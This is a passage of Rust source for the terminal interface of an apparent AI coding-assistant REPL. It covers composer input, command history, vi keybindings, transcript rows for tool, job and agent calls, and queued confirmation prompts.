    prompt_memory: Arc<PromptMemory>,
}

fn history_file(config: &AppConfig, session: Option<&str>) -> Option<PathBuf> {
    config
        .save_shell_history
        .then(|| crate::config::paths::repl_history_file_for(session))
}

fn load_history(path: Option<&Path>) -> ComposerHistory {
    let Some(path) = path else {
        return ComposerHistory::default();
    };
    ComposerHistory::load(path).unwrap_or_else(|err| {
        warn!("Failed to read the history at {}: {err}", path.display());
        ComposerHistory::default()
    })
}

fn vi_mode(config: &AppConfig) -> Option<ViMode> {
    (config.keybindings == "vi").then_some(ViMode::Insert)
}

impl App {
    pub(crate) fn new(
        clock: Arc<dyn Clock>,
        config: Arc<AppConfig>,
        prompt_memory: Arc<PromptMemory>,
        footer: FooterInfo,
    ) -> Result<Self> {
        let options = config.render_options()?;
        let background = field_background(&config, &options);
        let renderer = Renderer::new(options)?;
        let history_file = history_file(&config, footer.session.as_deref());
        Ok(Self {
            transcript: Transcript::new(footer.model.clone(), config.command_prefix),
            todo: TodoPanel::default(),
            composer: Composer::new(background, config.command_prefix),
            queued: Vec::new(),
            prompts: VecDeque::new(),
            lend_requests: Vec::new(),
            turn: None,
            exiting: false,
            exit_first_cell: 0,
            footer,
            usage: String::new(),
            last_keystroke: None,
            front_since: None,
            frame_area: None,
            question_area: None,
            frames: FrameScheduler::new(Arc::clone(&clock)),
            clock,
            renderer,
            macros: Vec::new(),
            view: View::Composer,
            palette_snapshot: PaletteSnapshot::EMPTY,
            palette_dirty: false,
            history: load_history(history_file.as_deref()),
            history_file,
            vi_mode: vi_mode(&config),
            vi_pending_d: false,
            last_esc: None,
            config,
            prompt_memory,
        })
    }

    pub(crate) fn schedule_frame(&mut self) {
        self.frames.schedule_frame();
    }

    #[cfg(test)]
    fn set_no_color(&mut self, no_color: bool) {
        self.renderer.no_color = no_color;
    }

    pub(crate) fn composer_text(&self) -> String {
        self.composer.text()
    }

    pub(crate) fn set_composer_text(&mut self, text: &str) {
        self.composer.set_text(text);
        // Text put there by anything but the walk ends the walk: the next
        // Up starts from the newest entry again.
        self.history.reset();
        self.palette_dirty = true;
        self.schedule_frame();
    }

    /// Re-reads what the footer and the renderer take from the context;
    /// called whenever the context is back in the UI's hands.
    pub(crate) fn sync_from_ctx(&mut self, ctx: &mut RequestContext) {
        self.footer = FooterInfo::from_ctx(ctx);
        self.macros = ctx
            .visible_macro_completions()
            .into_iter()
            .map(|(name, description)| (name, description.unwrap_or_default()))
            .collect();
        self.palette_snapshot = PaletteSnapshot::from_ctx(ctx);
        if !Arc::ptr_eq(&self.config, &ctx.app.config) {
            let config = &ctx.app.config;
            match config.render_options().and_then(|options| {
                let background = field_background(config, &options);
                Renderer::new(options).map(|renderer| (renderer, background))
            }) {
                Ok((mut renderer, background)) => {
                    renderer.no_color = self.renderer.no_color;
                    self.renderer = renderer;
                    self.composer.set_background(background);
                }
                Err(err) => warn!("Keeping the previous render options: {err}"),
            }
            self.composer.set_command_prefix(config.command_prefix);
            self.config = Arc::clone(&ctx.app.config);
            self.vi_mode = match (vi_mode(&self.config), self.vi_mode) {
                (Some(_), Some(current)) => Some(current),
                (wanted, _) => wanted,
            };
        }
        // A new session, or history switched on or off, means another
        // file; the entries of the run so far go with the old one.
        let file = history_file(&self.config, self.footer.session.as_deref());
        if file != self.history_file {
            self.history_file = file;
            self.history = load_history(self.history_file.as_deref());
        }
        if let Some(text) = ctx.pending_prefill.take() {
            self.set_composer_text(&text);
        }
        self.todo
            .set(ctx.todo_list.goal.clone(), ctx.todo_list.todos.clone());
        self.schedule_frame();
    }

    /// Records that a line left for the work task. A command gets its cell
    /// now, so the transcript shows what is running under a modal the
    /// command raises; the output fills in when the turn ends. The view
    /// follows again so the line just sent is not out of sight, and a
    /// focused row lets go: the line opens a new context.
    pub(crate) fn begin_turn(&mut self, line: &str, command: bool) {
        self.transcript.clear_welcome();
        self.transcript.scroll_to_bottom();
        self.transcript.clear_focus();
        let first_cell = self.transcript.len();
        self.transcript.push(if command {
            Cell::command(line)
        } else {
            Cell::user(line)
        });
        self.turn = Some(TurnStatus {
            started: self.clock.now(),
            busy: None,
            thinking_since: None,
            tool: None,
            first_cell,
            requested: false,
        });
        self.schedule_frame();
    }

    /// Commits what the work task brought back.
    pub(crate) fn end_turn(&mut self, command: bool, outcome: &TurnOutcome) {
        let turn = self.turn.take();
        self.close_stream();
        if let Some(turn) = &turn {
            self.fail_unreported_tools(turn.first_cell);
        }
        if command {
            let turn = turn.expect("end_turn follows begin_turn");
            let index = turn.first_cell;
            let prefix = self.config.command_prefix;
            let Some(Cell::Command {
                name,
                output,
                opened,
                rewind_barrier: barrier,
                cache,
            }) = self.transcript.cell_mut(index)
            else {
                panic!("begin_turn pushed a Command cell for a command turn");
            };
            *output = outcome.captured.clone();
            *opened = turn.requested;
            // A command that failed before asking the model changed
            // nothing the picker has to stop at; a macro that failed at a
            // later step already recorded the exchanges before it.
            *barrier = (outcome.error.is_none() || turn.requested)
                .then(|| rewind_barrier(name, prefix, &self.macros))
                .flatten();
            *cache = LineCache::default();
            // `.undo` took the last exchange out of the context; the
            // transcript drops it too, back to the cell that opened it,
            // and the command cell with it.
            if outcome.error.is_none()
                && is_undo(name, prefix)
                && let Some(opener) = undo_opener(self.transcript.cells(), index, prefix)
            {
                self.transcript.truncate(opener);
            }
        } else {
            if let Some(turn) = &turn
                && let Some(Cell::User { opened, .. }) = self.transcript.cell_mut(turn.first_cell)
            {
                *opened = turn.requested;
            }
            if !outcome.captured.trim().is_empty() {
                self.transcript.push(Cell::notice(
                    NoticeKind::Routing,
                    render::plain_text(&outcome.captured).trim_end().to_string(),
                ));
            }
        }
        if let Some(error) = &outcome.error {
            // Errors arrive painted for the REPL like notices do.
            self.transcript.push(Cell::Error {
                text: render::plain_text(error),
                cache: LineCache::default(),
            });
        }
        self.schedule_frame();
    }

    pub(crate) fn begin_exit(&mut self) {
        // Called again (a signal while the exit work already runs) it
        // keeps the first call's start, or the exit's late output so far
        // would fall before it.
        if !self.exiting {
            self.exiting = true;
            self.transcript.clear_welcome();
            self.exit_first_cell = self.transcript.len();
        }
        self.schedule_frame();
    }

    fn close_stream(&mut self) {
        if let Some(Cell::Assistant { done, .. }) = self.transcript.close_stream() {
            *done = true;
        }
    }

    /// A tool row still running when its turn ends never got its
    /// finish hook: the turn was interrupted or the task died under it.
    /// Job and agent rows are left alone; their work goes on in the
    /// background.
    fn fail_unreported_tools(&mut self, first_cell: usize) {
        let now = self.clock.now();
        for cell in self.transcript.cells_mut().iter_mut().skip(first_cell) {
            if let Cell::Tool { status, .. } = cell
                && let ToolStatus::Running { since } = *status
            {
                *status = ToolStatus::Failed {
                    elapsed: now.duration_since(since),
                    error: "interrupted".to_string(),
                };
            }
        }
    }

    fn turn_first_cell(&self) -> usize {
        self.turn.as_ref().map_or(0, |turn| turn.first_cell)
    }

    fn key_context(&self) -> KeyContext {
        let now = self.clock.now();
        let idle_ok = self
            .last_keystroke
            .is_none_or(|at| now.duration_since(at) >= HOTKEY_IDLE);
        let field_settled = self
            .front_since
            .is_some_and(|at| now.duration_since(at) >= HOTKEY_IDLE);
        // The cap says what the frame should allow; the rows the last
        // draw actually gave the question say what it got. A frame too
        // short for the layout squeezes the question below its cap.
        let question_fully_shown = match (self.prompts.front(), self.frame_area) {
            (Some(prompt), Some(area)) => {
                prompt.question_fits_cap(area.width, area.height)
                    && self
                        .question_area
                        .is_none_or(|given| prompt.question_fits_rows(given.width, given.height))
            }
            _ => true,
        };
        KeyContext {
            turn_running: self.turn.is_some() || self.exiting,
            composer_empty: self.composer.is_empty(),
            single_line: self.composer.lines().len() <= 1,
            modal: self.prompts.front().map(PendingPrompt::kind),
            idle_ok,
            field_settled,
            question_fully_shown,
            scrolled: self.transcript.scrolled(),
            focused: self.transcript.focused(),
            popup: match self.view {
                View::Composer => None,
                View::Palette(_) => Some(PopupKind::Palette),
                View::HistorySearch(_) => Some(PopupKind::HistorySearch),
                View::Rewind(_) => Some(PopupKind::Rewind),
            },
            vi: self.vi_mode,
        }
    }

    /// The composer's line when it is a single line opening with a
    /// sigil the configured prefix accepts, a leading `:::` fence token
    /// skipped: the line the palette is for.
    fn command_line(&self) -> Option<&str> {
        let [line] = self.composer.lines() else {
            return None;
        };
        let unfenced = line.trim_start();
        let unfenced = match unfenced.strip_prefix(":::") {
            Some(rest) if rest.starts_with(' ') => rest.trim_start(),
            _ => unfenced,
        };
        let first = unfenced.chars().next()?;
        self.config
            .command_prefix
            .accepts(first)
            .then_some(line.as_str())
    }

    /// Opens, refreshes or closes the palette after an edit of the
    /// composer; an edit under another band closes that band. With the
    /// context in hand the rows include arguments and macros; mid-turn
    /// they are the commands the snapshot allows.
    pub(crate) fn refresh_palette(&mut self, ctx: Option<&RequestContext>) {
        if !self.palette_dirty {
            return;
        }
        self.palette_dirty = false;
        let palette = match self.command_line() {
            Some(line) if self.prompts.is_empty() => PaletteState::build(
                line,
                self.config.command_prefix,
                self.palette_snapshot,
                &self.macros,
                ctx,
            ),
            _ => None,
        };
        self.view = match palette {
            Some(palette) => View::Palette(palette),
            None => View::Composer,
        };
        self.schedule_frame();
    }

    fn close_view(&mut self) {
        self.view = View::Composer;
        self.palette_dirty = false;
    }

    /// Puts a history entry in the composer. Walking the history is not
    /// an edit: the palette stays closed so the next Up or Down keeps
    /// walking, and it reopens with the first real edit.
    fn recall_history_entry(&mut self, text: &str) {
        self.composer.set_text(text);
        self.close_view();
        self.schedule_frame();
    }

    fn record_history(&mut self, line: &str) {
        self.history.push(line);
        if let Some(path) = &self.history_file
            && let Err(err) = history::append(path, line)
        {
            warn!("Failed to write the history at {}: {err}", path.display());
        }
    }

    /// Takes the trimmed draft out of the composer and into the history;
    /// None when there is nothing but whitespace.
    fn take_composer_line(&mut self) -> Option<String> {
        let text = self.composer_text();
        if text.trim().is_empty() {
            return None;
        }
        self.composer.clear();
        self.palette_dirty = true;
        self.transcript.clear_focus();
        // The next line is typed, so the vi layer starts it in insert.
        self.vi_mode = self.vi_mode.map(|_| ViMode::Insert);
        let line = text.trim().to_string();
        self.record_history(&line);
        Some(line)
    }

    fn submit_composer(&mut self) -> Option<Command> {
        self.take_composer_line().map(Command::Submit)
    }

    fn queue_composer(&mut self) -> Option<Command> {
        if self.exiting {
            return None;
        }
        self.hold_composer_line().map(Command::Queue)
    }

    /// Holds the draft for the running turn. A prompt is returned for the
    /// loop, which offers it to the model; a command only waits.
    fn hold_composer_line(&mut self) -> Option<String> {
        let line = self.take_composer_line()?;
        let command = is_command(&line, self.config.command_prefix);
        self.queued.push(QueuedLine {
            text: line.clone(),
            command,
        });
        (!command).then_some(line)
    }

    /// Takes the newest held line back into the composer. A draft under
    /// it is not lost: it joins the end of the queue, so the two trade
    /// places.
    fn edit_queued(&mut self) -> Option<Command> {
        let line = self.queued.pop()?;
        let draft = self.hold_composer_line();
        self.set_composer_text(&line.text);
        let held = (!line.command).then_some(line.text);
        if held.is_none() && draft.is_none() {
            return None;
        }
        Some(Command::Unqueue { held, draft })
    }

    /// An interrupt, or the quit that follows one, is for everything the
    /// user lined up, not just the turn that is running.
    fn drop_queued(&mut self) {
        let dropped = self.queued.len();
        if dropped > 0 {
            self.queued.clear();
            self.push_notice(
                NoticeKind::Interrupted,
                format!("Dropped {dropped} queued line(s)"),
            );
        }
    }

    /// A second idle Esc within the gap opens the rewind picker, when
    /// the transcript holds an exchange to go back to.
    fn idle_esc(&mut self) {
        let now = self.clock.now();
        let second = self
            .last_esc
            .is_some_and(|at| now.duration_since(at) <= REWIND_ESC_GAP);
        self.last_esc = (!second).then_some(now);
        if !second {
            return;
        }
        let (rewind, barrier) =
            RewindState::from_cells(self.transcript.cells(), self.config.command_prefix);
        if let Some(barrier) = barrier {
            self.push_notice(
                NoticeKind::ToolWarning,
                format!("Rewind stops at the last {}", barrier.kind_name()),
            );
        }
        if let Some(rewind) = rewind {
            self.view = View::Rewind(rewind);
        }
    }

    /// Takes the band's highlighted row: the palette's into the typed
    /// token, the search's into the composer, the rewind picker's to
    /// the loop. The palette with no highlight lets the Enter do what
    /// it does without a band: submit when idle, queue during a turn.
    fn accept_popup(&mut self) -> Option<Command> {
        match &self.view {
            View::HistorySearch(search) => {
                let chosen = search.highlighted().map(str::to_string);
                match chosen {
                    Some(text) => self.recall_history_entry(&text),
                    None => self.close_view(),
                }
                self.history.reset();
                None
            }
            View::Rewind(rewind) => {
                let chosen = rewind.chosen().map(Command::Rewind);
                self.close_view();
                chosen
            }
            View::Palette(palette) => {
                if palette.highlighted().is_none() {
                    return if self.turn.is_some() || self.exiting {
                        self.queue_composer()
                    } else {
                        self.submit_composer()
                    };
                }
                // The band may outlive the line it was built on (an
                // editor's result, a rewind's prefill); a range the line
                // no longer has names nothing, so the band just closes.
                let accepted = self.command_line().and_then(|line| palette.accept(line));
                self.close_view();
                if let Some(text) = accepted {
                    self.set_composer_text(&text);
                }
                None
            }
            View::Composer => None,
        }
    }

    pub(crate) fn handle_input(&mut self, input: TermInput) -> Option<Command> {
        match input {
            TermInput::Key(key) => self.handle_key(key),
            TermInput::Paste(text) => {
                self.last_keystroke = Some(self.clock.now());
                // Terminals deliver a multi-line paste with the line ends
                // they use themselves (CR, CRLF or LF); the composer and
                // the field take one shape.
                let text = text.replace("\r\n", "\n").replace('\r', "\n");
                match self.prompts.front_mut() {
                    // A confirm has no field, and the composer is hidden
                    // under the modal: a paste there would land where the
                    // user cannot see it.
                    Some(prompt) => {
                        if let Some(field) = prompt.field.as_mut() {
                            field.insert_str(text.replace('\n', " "));
                        }
                    }
                    None => {
                        self.composer.insert_str(&text);
                        self.palette_dirty = true;
                    }
                }
                self.schedule_frame();
                None
            }
            TermInput::Resize => {
                self.schedule_frame();
                None
            }
            TermInput::Mouse(mouse) => {
                match mouse.kind {
                    MouseEventKind::ScrollUp => self.transcript.scroll_lines(-WHEEL_LINES),
                    MouseEventKind::ScrollDown => self.transcript.scroll_lines(WHEEL_LINES),
                    MouseEventKind::Down(MouseButton::Left) => {
                        self.transcript.click(mouse.column, mouse.row)
                    }
                    _ => return None,
                }
                self.schedule_frame();
                None
            }
            TermInput::Ignored => None,
        }
    }

    pub(crate) fn handle_key(&mut self, key: KeyEvent) -> Option<Command> {
        let action = keys::map_key(key, &self.key_context());
        // Every key pressed while no question is up re-arms the idle gate,
        // the ignored ones included: an Enter tapped during a turn is a
        // keystroke the user is still making when the confirm appears. So
        // does a key a modal ignores: typing that runs on under a confirm
        // is not idleness either. Hotkeys answering a modal do not count;
        // `answer_front` re-arms for the next queued question instead. Nor
        // do the view keys a modal lets through: scrolling back to reread
        // is not typing.
        if self.prompts.is_empty() || action == Action::Nothing {
            self.last_keystroke = Some(self.clock.now());
        }
        // The two-key sequences only count consecutive presses.
        if action != Action::IdleEsc {
            self.last_esc = None;
        }
        if action != Action::ViDeleteLine {
            self.vi_pending_d = false;
        }
        let command = match action {
            Action::Submit => self.submit_composer(),
            Action::QueueInput => self.queue_composer(),
            Action::EditQueued => self.edit_queued(),
            Action::InsertNewline => {
                self.composer.insert_newline();
                self.palette_dirty = true;
                None
            }
            Action::ClearComposer => {
                self.set_composer_text("");
                None
            }
            Action::Interrupt => {
                self.transcript.clear_focus();
                self.drop_queued();
                (!self.exiting).then_some(Command::Interrupt)
            }
            Action::IdleEsc => {
                self.idle_esc();
                None
            }
            Action::Quit => {
                self.drop_queued();
                (!self.exiting).then_some(Command::Quit)
            }
            Action::Suspend => Some(Command::Suspend),
            Action::OpenEditor => Some(Command::OpenEditor),
            Action::ScheduleFrame => Some(Command::Redraw),
            Action::Answer(answer) => {
                self.answer_front(answer);
                None
            }
            Action::AnswerYesForSession => {
                if let Some(prompt) = self.prompts.front()
                    && let Some(tool) = prompt.req.tool.as_deref()
                {
                    self.prompt_memory.remember(tool, &prompt.req.question);
                }
                self.answer_front(PromptAnswer::Confirmed(true));
                None
            }
            Action::SubmitModalInput => {
                if let Some(answer) = self.prompts.front().map(PendingPrompt::field_answer) {
                    self.answer_front(answer);
                }
                None
            }
            Action::SubmitModalChoice => {
                if let Some(prompt) = self.prompts.front_mut() {
                    match prompt.choice() {
                        Some(answer) => self.answer_front(answer),
                        // The select's cursor is on the custom row: the
                        // field opens with a fresh gate, so the Enter that
                        // opened it cannot also send an empty answer.
                        None => {
                            prompt.open_custom_field();
                            let now = self.clock.now();
                            self.last_keystroke = Some(now);
                            self.front_since = Some(now);
                        }
                    }
                }
                None
            }
            Action::ModalMove(delta) => {
                if let Some(prompt) = self.prompts.front_mut() {
                    prompt.move_cursor(delta);
                }
                None
            }
            Action::ModalToggle => {
                if let Some(prompt) = self.prompts.front_mut() {
                    prompt.toggle_cursor();
                }
                None
            }
            Action::ModalJump(index) => {
                if let Some(prompt) = self.prompts.front_mut()
                    && index < prompt.req.options.len()
                {
                    prompt.cursor = index;
                    if let Some(answer) = prompt.choice() {
                        self.answer_front(answer);
                    }
                }
                None
            }
            Action::ModalInput(key) => {
                self.last_keystroke = Some(self.clock.now());
                if let Some(field) = self.prompts.front_mut().and_then(|p| p.field.as_mut()) {
                    field.input(key);
                }
                None
            }
            Action::ComposerInput(key) => {
                // Tab on a command line asks for the palette rather than
                // indenting the command.
                if key.code != KeyCode::Tab || self.command_line().is_none() {
                    self.composer.input(key);
                }
                self.palette_dirty = true;
                None
            }
            Action::HistoryPrev => {
                let draft = self.composer_text();
                if let Some(entry) = self.history.prev(&draft).map(str::to_string) {
                    self.recall_history_entry(&entry);
                }
                None
            }
            Action::HistoryNext => {
                if let Some(text) = self.history.next() {
                    self.recall_history_entry(&text);
                }
                None
            }
            Action::OpenHistorySearch => {
                self.view = View::HistorySearch(SearchState::new(&self.history));
                None
            }
            Action::PaletteMove(delta) => {
                match &mut self.view {
                    View::Composer => {}
                    View::Palette(palette) => palette.move_highlight(delta),
                    View::HistorySearch(search) => search.move_highlight(delta),
                    View::Rewind(rewind) => rewind.move_highlight(delta),
                }
                None
            }
            Action::PaletteAccept => self.accept_popup(),
            Action::ClosePopup => {
                self.close_view();
                None
            }
            Action::PopupChar(c) => {
                if let View::HistorySearch(search) = &mut self.view {
                    search.push_char(c, &self.history);
                }
                None
            }
            Action::PopupBackspace => {
                if let View::HistorySearch(search) = &mut self.view {
                    search.pop_char(&self.history);
                }
                None
            }
            Action::ViNormal => {
                self.vi_mode = Some(ViMode::Normal);
                None
            }
            Action::ViInsert { append } => {
                if let Some(motion) = append {
                    self.composer.move_cursor_to_append(motion);
                }
                self.vi_mode = Some(ViMode::Insert);
                None
            }
            Action::ViMotion(motion) => {
                self.composer.move_cursor(motion);
                None
            }
            Action::ViDeleteChar => {
                self.composer.delete_next_char();
                self.palette_dirty = true;
                None
            }
            Action::ViDeleteLine => {
                if self.vi_pending_d {
                    self.composer.delete_line();
                    self.palette_dirty = true;
                }
                self.vi_pending_d = !self.vi_pending_d;
                None
            }
            Action::ToggleTodo => {
                self.todo.toggle();
                None
            }
            Action::ScrollLines(delta) => {
                self.transcript.scroll_lines(delta);
                None
            }
            Action::ScrollPage(direction) => {
                self.transcript.scroll_page(direction);
                None
            }
            Action::ScrollToBottom => {
                self.transcript.scroll_to_bottom();
                None
            }
            Action::FocusPrev => {
                self.transcript.focus_prev();
                None
            }
            Action::FocusNext => {
                self.transcript.focus_next();
                None
            }
            Action::ToggleFocused => {
                self.transcript.toggle_focused();
                None
            }
            Action::ClearFocus => {
                self.transcript.clear_focus();
                None
            }
            Action::Nothing => None,
        };
        self.schedule_frame();
        command
    }

    fn answer_front(&mut self, answer: PromptAnswer) {
        if let Some(prompt) = self.prompts.pop_front() {
            // The asker gave up waiting (its turn was interrupted); the
            // answer has nowhere to go.
            let _ = prompt.reply.send(answer);
            self.arm_front_gates();
        }
    }

    /// Starts the modal gates over for whatever prompt is now at the
    /// front: a held or repeated key must not answer it on the previous
    /// prompt's momentum, and a user idle for a second who taps a key as
    /// the modal comes up has not seen it yet.
    fn arm_front_gates(&mut self) {
        let now = self.clock.now();
        self.last_keystroke = Some(now);
        self.front_since = (!self.prompts.is_empty()).then_some(now);
        self.question_area = None;
    }

    pub(crate) fn handle_msg(&mut self, msg: UiMsg) {
        if let Some(turn) = self.turn.as_mut()
            && matches!(
                msg,
                UiMsg::TextDelta(_)
                    | UiMsg::StreamDone
                    | UiMsg::AssistantText(_)
                    | UiMsg::ThinkingStarted
                    | UiMsg::ToolNarration { .. }
                    | UiMsg::Busy(Some(_))
            )
        {
            turn.requested = true;
        }
        match msg {
            UiMsg::TextDelta(delta) => match self.transcript.stream_cell_mut() {
                Some(Cell::Assistant { source, .. }) => source.push_str(&delta),
                _ => self.transcript.open_stream(Cell::assistant(delta, false)),
            },
            UiMsg::StreamDone => self.close_stream(),
            UiMsg::AssistantText(text) => match self.transcript.close_stream() {
                Some(Cell::Assistant {
                    source,
                    done,
                    cache,
                }) => {
                    *source = text;
                    *done = true;
                    *cache = RenderCache::default();
                }
                _ => self.transcript.push(Cell::assistant(text, true)),
            },
            UiMsg::Notice { kind, text } => self.push_notice(kind, text),
            UiMsg::ToolNarration { call_id, line } => {
                // The todo panel shows what a todo call did; its row
                // would only repeat it.
                if !cells::narrated_tool_name(&line).starts_with("todo__") {
                    self.transcript
                        .push(Cell::tool(call_id, line, self.clock.now()));
                }
            }
            UiMsg::ToolOutput { call_id, bytes } => self.append_tool_output(call_id, &bytes),
            UiMsg::ToolStarted {
                call_id,
                name,
                args,
            } => self.tool_started(call_id, name, args),
            UiMsg::ToolFinished {
                call_id,
                ok,
                error,
                duration_ms,
            } => {
                self.tool_finished(&call_id, ok, error, duration_ms);
                self.dismiss_prompts(|prompt| prompt.asked_by_call(&call_id));
            }
            UiMsg::JobStarted { job_id, tool } => self.start_row(
                Cell::Job {
                    job_id,
                    tool,
                    status: JobStatus::Running,
                    calls: Vec::new(),
                    expanded: false,
                },
                "job__start",
            ),
            UiMsg::JobFinished { job_id, ok, error } => {
                self.set_job_status(
                    &job_id,
                    if ok {
                        JobStatus::Done
                    } else {
                        JobStatus::Failed(error.unwrap_or_default())
                    },
                );
                self.dismiss_prompts(|prompt| prompt.asked_by_job(&job_id));
            }
            UiMsg::JobCancelled { job_id } => {
                self.set_job_status(&job_id, JobStatus::Cancelled);
                self.dismiss_prompts(|prompt| prompt.asked_by_job(&job_id));
            }
            UiMsg::AgentStarted { agent_id, name } => self.start_row(
                Cell::Agent {
                    agent_id,
                    name,
                    status: AgentStatus::Running,
                    calls: Vec::new(),
                    expanded: false,
                },
                "agent__spawn",
            ),
            UiMsg::AgentFinished { agent_id, outcome } => {
                let status = match outcome {
                    AgentOutcome::Completed => AgentStatus::Completed,
                    AgentOutcome::Failed(error) => AgentStatus::Failed(error),
                    AgentOutcome::Interrupted => AgentStatus::Interrupted,
                };
                self.set_agent_status(&agent_id, status);
                self.dismiss_prompts(|prompt| prompt.asked_by_agent(&agent_id));
            }
            UiMsg::TodoUpdated(items) => self.todo.set_items(items),
            UiMsg::QueuedInputSent(text) => {
                // The cell is committed whether or not a held line matched:
                // the model received the text either way, and the strip may
                // already have let it go (an interrupt's drop, a swap).
                remove_sent(&mut self.queued, &text);
                self.transcript.push(Cell::user_mid_turn(plain_text(&text)))
            }
            UiMsg::Busy(message) => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.busy = message;
                }
            }
            UiMsg::TurnDivider => {}
            UiMsg::ThinkingStarted => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.thinking_since = Some(self.clock.now());
                }
            }
            UiMsg::ThinkingStopped => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.thinking_since = None;
                }
            }
            UiMsg::UsageUpdated(right) => self.usage = right,
            UiMsg::ToolRunning(tool) => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.tool = tool;
                }
            }
            UiMsg::Prompt { req, reply } => self.enqueue_prompt(*req, reply),
            UiMsg::LendTerminal(job) => self.lend_requests.push(job),
        }
        self.schedule_frame();
    }

    fn take_lend_requests(&mut self) -> Vec<LendJob> {
        std::mem::take(&mut self.lend_requests)
    }

    /// The tool row a hook's call id names: the row with that id, or,
    /// for a model that gave no id, the newest running row without one.
    fn tool_row(&self, call_id: &str) -> Option<usize> {
        let cells = self.transcript.cells();
        (self.turn_first_cell()..cells.len())
            .rev()
            .find(|&index| match &cells[index] {
                Cell::Tool {
                    call_id: id,
                    status,
                    ..
                } if call_id.is_empty() => {
                    id.is_empty() && matches!(status, ToolStatus::Running { .. })
                }
                Cell::Tool { call_id: id, .. } => id == call_id,
                _ => false,
            })
    }

    /// The job or agent row a `job__*` or `agent__*` call addresses by
    /// the id in its arguments.
    fn addressed_row(&self, name: &str, args: Option<&Value>) -> Option<usize> {
        let id = args?.get("id")?.as_str()?;
        let job = matches!(name, "job__check" | "job__collect" | "job__cancel");
        let agent = matches!(
            name,
            "agent__check" | "agent__collect" | "agent__send_message" | "agent__cancel"
        );
        self.transcript.cells().iter().rposition(|cell| match cell {
            Cell::Job { job_id, .. } => job && job_id == id,
            Cell::Agent { agent_id, .. } => agent && agent_id == id,
            _ => false,
        })
    }

    /// Names the row the narration opened. A call that checks on a job
    /// or agent folds into that job's or agent's row instead, so the
    /// transcript shows one row per background task rather than one per
    /// look at it.
    fn tool_started(&mut self, call_id: String, name: String, args: Option<Value>) {
        let Some(mut row) = self.addressed_row(&name, args.as_ref()) else {
            if let Some(index) = self.tool_row(&call_id)
                && let Some(Cell::Tool {
                    name: current,
                    args: short,
                    bookkeeping,
                    ..
                }) = self.transcript.cell_mut(index)
            {
                *bookkeeping = cells::is_bookkeeping(&name);
                *current = name;
                if let Some(args) = &args {
                    *short = cells::short_args(&args.to_string());
                }
            }
            return;
        };
        if let Some(index) = self.tool_row(&call_id) {
            self.transcript.remove(index);
            if index < row {
                row -= 1;
            }
        }
        if let Some(Cell::Job { calls, .. } | Cell::Agent { calls, .. }) =
            self.transcript.cell_mut(row)
        {
            calls.push(FoldedCall::new(call_id, name));
        }
    }

    fn tool_finished(
        &mut self,
        call_id: &str,
        ok: bool,
        error: Option<String>,
        duration_ms: Option<u64>,
    ) {
        let now = self.clock.now();
        let Some(index) = self.tool_row(call_id) else {
            return;
        };
        if let Some(Cell::Tool { status, .. }) = self.transcript.cell_mut(index)
            && let ToolStatus::Running { since } = *status
        {
            // The hook's own measurement when it has one; the UI's clock
            // otherwise, so a failed call still shows how long it took.
            let elapsed =
                duration_ms.map_or_else(|| now.duration_since(since), Duration::from_millis);
            *status = if ok {
                ToolStatus::Ok { elapsed }
            } else {
                ToolStatus::Failed {
                    elapsed,
                    error: error.unwrap_or_default(),
                }
            };
        }
    }

    /// A job or agent row takes the place of the running `starter` call
    /// that made it, keeping that call folded so its output still routes
    /// to the row; without one the row is appended.
    fn start_row(&mut self, row: Cell, starter: &str) {
        let cells = self.transcript.cells();
        let running = (self.turn_first_cell()..cells.len()).rev().find(|&index| {
            matches!(
                &cells[index],
                Cell::Tool {
                    status: ToolStatus::Running { .. },
                    ..
                }
            )
        });
        match running {
            Some(index) if matches!(&cells[index], Cell::Tool { name, .. } if name == starter) => {
                let Cell::Tool {
                    call_id,
                    name,
                    output,
                    open_line,
                    pending,
                    ..
                } = self.transcript.replace(index, row)
                else {
                    unreachable!("the index was found holding a tool row");
                };
                if let Some(Cell::Job { calls, .. } | Cell::Agent { calls, .. }) =
                    self.transcript.cell_mut(index)
                {
                    calls.push(FoldedCall {
                        call_id,
                        name,
                        output,
                        open_line,
                        pending,
                    });
                }
            }
            _ => self.transcript.push(row),
        }
    }

    fn set_job_status(&mut self, job_id: &str, status: JobStatus) {
        for cell in self.transcript.cells_mut().iter_mut().rev() {
            if let Cell::Job {
                job_id: id,
                status: current,
                ..
            } = cell
                && id == job_id
            {
                *current = status;
                return;
            }
        }
    }

    fn set_agent_status(&mut self, agent_id: &str, status: AgentStatus) {
        for cell in self.transcript.cells_mut().iter_mut().rev() {
            if let Cell::Agent {
                agent_id: id,
                status: current,
                ..
            } = cell
                && id == agent_id
            {
                *current = status;
                return;
            }
        }
    }

    fn enqueue_prompt(&mut self, req: PromptRequest, reply: mpsc::Sender<PromptAnswer>) {
        self.close_view();
        let becomes_front = self.prompts.is_empty();
        self.prompts.push_back(PendingPrompt::new(req, reply));
        if becomes_front {
            self.arm_front_gates();
        }
    }

    /// Cancels every question, queued or up, whose asker has ended: the
    /// tool was killed or the job finished under it, so nobody is left
    /// to take the answer. The front's successor gets a fresh gate.
    fn dismiss_prompts(&mut self, asked_by: impl Fn(&PendingPrompt) -> bool) {
        let front_dismissed = self.prompts.front().is_some_and(&asked_by);
        self.prompts.retain(|prompt| {
            if asked_by(prompt) {
                let _ = prompt.reply.send(PromptAnswer::Cancelled);
                false
            } else {
                true
            }
        });
        if front_dismissed {
            self.arm_front_gates();
        }
    }

    /// Late command output arrives one pipe read at a time; consecutive
    /// chunks join the trailing Routing cell instead of each taking a
    /// cell of their own, and the cell keeps only its newest text.
    fn push_notice(&mut self, kind: NoticeKind, mut text: String) {
        if kind != NoticeKind::Routing {
            self.transcript.push(Cell::notice(kind, text));
            return;
        }
        text.truncate(text.trim_end_matches('\n').len());
        // The exit's output never folds into a cell from before it, so it
        // stays readable as the exit's own.
        let merge_from = if self.exiting {
            self.exit_first_cell
        } else {
            0
        };
        if self.transcript.len() > merge_from
            && let Some(Cell::Notice {
                kind: NoticeKind::Routing,
                text: tail,
                cache,
            }) = self.transcript.last_mut()
        {
            if !tail.is_empty() && !text.is_empty() {
                tail.push('\n');
            }
            tail.push_str(&text);
            if tail.len() > LATE_OUTPUT_LIMIT {
                let cut = tail.len() - LATE_OUTPUT_LIMIT;
                let cut = (cut..=tail.len())
                    .find(|at| tail.is_char_boundary(*at))
                    .unwrap_or(tail.len());
                tail.drain(..cut);
            }
            *cache = LineCache::default();
            return;
